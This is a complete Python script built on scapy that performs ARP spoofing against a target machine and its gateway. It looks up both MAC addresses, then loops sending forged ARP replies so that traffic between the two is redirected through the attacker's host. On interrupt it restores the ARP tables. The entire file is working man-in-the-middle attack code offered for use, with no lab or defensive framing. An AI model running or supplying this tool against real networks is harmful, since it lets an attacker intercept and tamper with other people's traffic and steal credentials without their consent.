import argparse
from scapy.all import *

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help='IP address of the target machine')
parser.add_argument('-g','--gateway',help='IP address of the gateway')


def getMAC(targetip):
    targetmac = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1,pdst=targetip),verbose=False,timeout=2)
    return targetmac[0][0][1].hwsrc

def arpSpoof(targetip,targetmac,sourceip):
    send(ARP(op=2,pdst=targetip,psrc=sourceip,hwdst=targetmac),verbose=False)

def restoreARP(targetip,targetmac,sourceip,sourcemac):
    send(ARP(op=2, pdst=targetip,hwdst=targetmac,psrc=sourceip,hwsrc=sourcemac),verbose=False)

def main():
    args = parser.parse_args()
    targetIP = args.target
    gatewayIP = args.gateway
    print('Target IP address: ',targetIP)
    print('Gateway IP address: ',gatewayIP)
    try:
        targetMAC = getMAC(targetIP)
        print('Target MAC address: ',targetMAC)
    except:
        print('Target machine does not exist or did not respond to ARP broadcast')
        quit()

    try:
        gatewayMAC = getMAC(gatewayIP)
        print('Gateway MAC address: ',gatewayMAC)
    except:
        print('Gateway is unreachable or did not respond to ARP broadcast')
        quit()

    try:
        print("Starting ARP spoofing...")
        while True:
            arpSpoof(targetIP,targetMAC,gatewayIP)
            arpSpoof(gatewayIP,gatewayMAC,targetIP)
    except KeyboardInterrupt:
        print("Stopping...")
        restoreARP(targetIP,targetMAC,gatewayIP,gatewayMAC)
        print('Restored ARP table')
        quit()

if __name__ == "__main__":
    main()








